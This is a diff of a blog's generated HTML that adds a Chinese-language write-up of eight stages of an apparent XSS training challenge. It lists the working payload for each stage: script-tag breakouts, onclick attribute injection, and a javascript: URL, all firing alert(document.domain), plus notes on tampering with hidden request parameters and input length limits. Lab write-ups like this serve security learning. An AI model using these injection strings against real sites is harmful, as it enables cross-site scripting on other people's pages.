@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
     <title>
         
-        Yuririn&#39;s blog
+        XSS Challenges · Yuririn&#39;s blog
         
     </title>
     <link rel="icon" href= /assests/favicon.ico>
@@ -68,11 +68,22 @@
     
 </head>
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Home</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">XSS Challenges</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>Home</a>
 </header>
@@ -80,50 +91,116 @@
         <div class="site-intro">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/pic/3.jpg)"></div>
     <div class="site-intro-placeholder"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
+            XSS Challenges
+            <!-- 404 -->
+            
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+        </p>
+        <!-- 404 -->
+        
         <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2019/03/16</span>
+            </div>
         
     </div>
 </div>
         <div class="container">
-            <main class="main index-page">
-    
-    
-    
-        <article class="index-post">
-            <a class="content-show-full" href = "/2017/10/02/hello-world/" >
-                    <h2 class="abstract-title">
-                        
-                        <span>emmmmm</span>
-                    </h2>
-                <div class="abstract-content">
-                    23333
+            <main class="main post-page">
+    <article class="article-entry">
+        <h3 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage #1"></a>Stage #1</h3><pre><code>1&quot;&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;
+</code></pre><p><img src="/pic/XSS-Challenges/1-1.png" alt="image"><br>弹框：<img src="/pic/XSS-Challenges/1-2.png" alt="image"><br><br></p>
+<h3 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage #2"></a>Stage #2</h3><pre><code>1&quot;/&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;
+</code></pre><p><img src="/pic/XSS-Challenges/2-1.png" alt="image"><br><br></p>
+<h3 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage #3"></a>Stage #3</h3><p>输入：<code>&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code>发现转义了&lt;&gt;<br><img src="/pic/XSS-Challenges/3-1.png" alt="image"><br>抓包修改第二个参数：<br><img src="/pic/XSS-Challenges/3-2.png" alt="image"><br><img src="/pic/XSS-Challenges/3-3.png" alt="image"><br>弹窗:<img src="/pic/XSS-Challenges/3-4.png" alt="image"><br><br></p>
+<h3 id="Stage-4"><a href="#Stage-4" class="headerlink" title="Stage #4"></a>Stage #4</h3><p>和3一样转义了&lt;&gt;，以及这次第二个参数也转义了&lt;&gt;抓包发现有第三个参数，修改这个参数的值：<br><img src="/pic/XSS-Challenges/4-2.png" alt="image"><br>弹窗:<img src="/pic/XSS-Challenges/4-1.png" alt="image"><br><br></p>
+<h3 id="Stage-5"><a href="#Stage-5" class="headerlink" title="Stage #5"></a>Stage #5</h3><p>输入框限制了内容的长度，F12修改maxlength，直接在后面补了个零：<br><img src="/pic/XSS-Challenges/5-1.png" alt="image"></p>
+<pre><code>1&quot;/&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;
+</code></pre><p><img src="/pic/XSS-Challenges/5-2.png" alt="image"><br><br></p>
+<h3 id="Stage-6"><a href="#Stage-6" class="headerlink" title="Stage #6"></a>Stage #6</h3><p>同样转义了&lt;&gt;，并且没有别的参数了<br>Hint: event handler attributes<br>搜了一下发现是需要利用HTML 事件属性</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"></th>
+<th style="text-align:center"></th>
+<th style="text-align:center"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">onload</td>
+<td style="text-align:center">script</td>
+<td style="text-align:center">页面结束加载之后触发。</td>
+</tr>
+<tr>
+<td style="text-align:center">onclick</td>
+<td style="text-align:center">script</td>
+<td style="text-align:center">元素上发生鼠标点击时触发。</td>
+</tr>
+<tr>
+<td style="text-align:center">onmousemove</td>
+<td style="text-align:center">script</td>
+<td style="text-align:center">当鼠标指针移动到元素上时触发。</td>
+</tr>
+<tr>
+<td style="text-align:center">onmouseover</td>
+<td style="text-align:center">script</td>
+<td style="text-align:center">当鼠标指针移动到元素上时触发。</td>
+</tr>
+</tbody>
+</table>
+<pre><code>&quot; onclick=&quot;alert(document.domain);
+</code></pre><p>然后点击输入框，弹出<br><img src="/pic/XSS-Challenges/6-1.png" alt="image"><br><br></p>
+<h3 id="Stage-7"><a href="#Stage-7" class="headerlink" title="Stage #7"></a>Stage #7</h3><p>输入<code>1&quot; onclick=&quot;alert(document.domain);</code>后发现<br><code>&lt;input name=&quot;p1&quot; size=&quot;50&quot; value=&quot;1&amp;quot;&quot; onclick=&quot;&amp;quot;alert(document.domain);&quot; type=&quot;text&quot;&gt;</code></p>
+<p>空格分割属性</p>
+<pre><code>1&quot; onclick=alert(document.domain);
+</code></pre><p><code>&lt;input name=&quot;p1&quot; size=&quot;50&quot; value=&quot;1&amp;quot;&quot; onclick=&quot;alert(document.domain);&quot; type=&quot;text&quot;&gt;</code><br>点击输入框，弹出<br><img src="/pic/XSS-Challenges/7-1.png" alt="image"><br><br></p>
+<h3 id="Stage-8"><a href="#Stage-8" class="headerlink" title="Stage #8"></a>Stage #8</h3><p>随便输入一个123，发现会产生一个a标签的跳转链接：<br><img src="/pic/XSS-Challenges/8-1.png" alt="image"><br>使用JavaScript中的伪协议（javascript:）</p>
+<pre><code>javascript:alert(document.domain);
+</code></pre><p>点击生成的URL，弹出<br><img src="/pic/XSS-Challenges/8-2.png" alt="image"></p>
 
-                </div>
-            </a>
-            <div class="abstract-post-meta">
-                <!-- tags  -->
-                
-                <!-- date  -->
-                <div class="abstract-date">
-                    <span class="abstract-calander iconfont-archer"></span><span class="abstract-time">2017/10/02</span>
-                </div>
-            </div>
-        </article>
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+        
+            <li class="previous">
+                <a href= "/2018/08/21/AES加密/" title= AES加密 >
+                    <span>Previous Post</span>
+                    <span>AES加密</span>
+                </a>
+            </li>
+        
+    </ul>
+
+
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-    <!-- paginator  -->
+    
+    <!--PC版-->
+
     
 </main>
             <!-- profile -->
